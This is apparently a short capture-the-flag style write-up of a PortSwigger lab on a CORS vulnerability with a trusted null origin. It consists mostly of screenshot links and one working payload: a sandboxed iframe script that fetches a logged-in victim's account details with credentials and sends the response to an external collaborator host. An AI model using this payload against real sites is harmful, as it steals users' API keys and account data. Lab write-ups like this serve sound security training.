# [CORS] Lab: CORS vulnerability with trusted null origin (1)

---

![Untitled](%5BCORS%5D%20Lab%20CORS%20vulnerability%20with%20trusted%20null%20or%20a47a47abb50a48ce82d3e9aa5fd96448/Untitled.png)

![Untitled](%5BCORS%5D%20Lab%20CORS%20vulnerability%20with%20trusted%20null%20or%20a47a47abb50a48ce82d3e9aa5fd96448/Untitled%201.png)

this site is bugged

![Untitled](%5BCORS%5D%20Lab%20CORS%20vulnerability%20with%20trusted%20null%20or%20a47a47abb50a48ce82d3e9aa5fd96448/Untitled%202.png)

---

this is the code I used: 

```jsx
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0a23000303750a3c817cf70a00780078.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://v400tvj4gbh15u39qzjv6cwv7mdd13ps.oastify.com/?key='+this.responseText;
};
</script>"></iframe>
```

this iframe would load and that the response and upload it to my collaborator. 

![Untitled](%5BCORS%5D%20Lab%20CORS%20vulnerability%20with%20trusted%20null%20or%20a47a47abb50a48ce82d3e9aa5fd96448/Untitled%203.png)

and now since we have the API key we can solve the lab. 

![Untitled](%5BCORS%5D%20Lab%20CORS%20vulnerability%20with%20trusted%20null%20or%20a47a47abb50a48ce82d3e9aa5fd96448/Untitled%204.png)